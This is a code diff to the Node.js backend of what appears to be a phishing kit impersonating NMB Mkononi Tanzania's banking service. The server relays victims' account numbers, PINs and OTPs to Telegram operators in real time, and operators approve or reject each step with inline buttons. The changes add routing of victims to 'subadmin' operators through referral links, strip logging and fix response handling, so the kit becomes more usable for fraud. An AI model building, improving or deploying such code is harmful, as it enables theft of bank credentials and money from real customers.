@@ -15,7 +15,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 const sessions = {}; 
 const adminMappings = {}; 
 
-// Send message to specific Telegram Chat ID (Fixed replyMarkup handling)
+// Send message to specific Telegram Chat ID
 async function sendTelegramMessage(chatId, text, replyMarkup = {}) {
     if (!TELEGRAM_BOT_TOKEN) {
         console.error('❌ ERROR: TELEGRAM_BOT_TOKEN is missing!');
@@ -82,9 +82,13 @@ async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel
     }
 }
 
+// Strictly route to the exact subadmin chat ID provided by ref, or fallback ONLY if ref is missing/invalid
 function getTargetAdminChat(ref) {
     if (ref && adminMappings[ref]) {
         return ref;
+    }
+    if (ref && /^\d+$/.test(ref)) {
+        return ref; // Direct chat ID passed via query
     }
     return DEFAULT_ADMIN_CHAT_ID;
 }
@@ -203,9 +207,8 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
     try {
         const update = req.body;
-        console.log('📥 Incoming Telegram Webhook Update:', JSON.stringify(update));
 
-        // Handle /start command securely to return permanent admin link
+        // Handle /start command securely to return permanent subadmin link
         if (update && update.message && update.message.text) {
             const messageObj = update.message;
             const chatId = messageObj.chat.id;
@@ -223,12 +226,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 const permanentLink = `${protocol}://${host}/?ref=${chatId}`;
                 
                 const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania, <b>${adminMappings[chatId].fullName}</b>!\n\n` +
-                                   `📋 <b>Taarifa Zako Binafsi (Permanent Admin Info):</b>\n` +
+                                   `📋 <b>Taarifa Zako Binafsi (Subadmin Info):</b>\n` +
                                    `• Telegram ID: <code>${chatId}</code>\n` +
                                    `• Status: <b>Mapped Permanently</b> ✅\n\n` +
                                    `🔗 <b>Kiungo Chako cha Kudumu (Your Permanent Link):</b>\n${permanentLink}`;
                 
-                console.log(`🚀 Replying to /start command for Chat ID: ${chatId}`);
                 await sendTelegramMessage(chatId, welcomeMsg, undefined);
                 return res.sendStatus(200);
             }
@@ -260,23 +262,38 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 if (action === 'allow' || action === 'otp_proceed') {
                     session.status = 'next_step';
                     statusLabel = action === 'allow' ? 'ALLOWED ✅' : 'PROCEEDED ✅';
-                    if (clientRes) clientRes.json({ success: true, status: 'next_step' });
+                    if (clientRes) {
+                        clientRes.json({ success: true, status: 'next_step' });
+                        session.clientRes = null;
+                    }
                 } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
                     session.status = 'restart_pin';
                     statusLabel = 'WRONG PIN / DENIED ❌';
-                    if (clientRes) clientRes.json({ success: false, status: 'restart_pin' });
+                    if (clientRes) {
+                        clientRes.json({ success: false, status: 'restart_pin' });
+                        session.clientRes = null;
+                    }
                 } else if (action === 'err_otp') {
                     session.status = 'restart_otp';
                     statusLabel = 'WRONG OTP ❌';
-                    if (clientRes) clientRes.json({ success: false, status: 'restart_otp' });
+                    if (clientRes) {
+                        clientRes.json({ success: false, status: 'restart_otp' });
+                        session.clientRes = null;
+                    }
                 } else if (action === 'err_acc') {
                     session.status = 'restart_acc';
                     statusLabel = 'INVALID ACCOUNT ❌';
-                    if (clientRes) clientRes.json({ success: false, status: 'restart_acc' });
+                    if (clientRes) {
+                        clientRes.json({ success: false, status: 'restart_acc' });
+                        session.clientRes = null;
+                    }
                 } else if (action === 'approve') {
                     session.status = 'success';
                     statusLabel = 'APPROVED 🎉';
-                    if (clientRes) clientRes.json({ success: true, status: 'success' });
+                    if (clientRes) {
+                        clientRes.json({ success: true, status: 'success' });
+                        session.clientRes = null;
+                    }
                 }
 
                 if (session.adminMsgId && query.message) {
@@ -304,3 +321,4 @@ app.post('/api/telegram-webhook', async (req, res) => {
 app.listen(PORT, () => {
     console.log(`NMB Mkononi Tanzania server running on port ${PORT}`);
 });
+                               
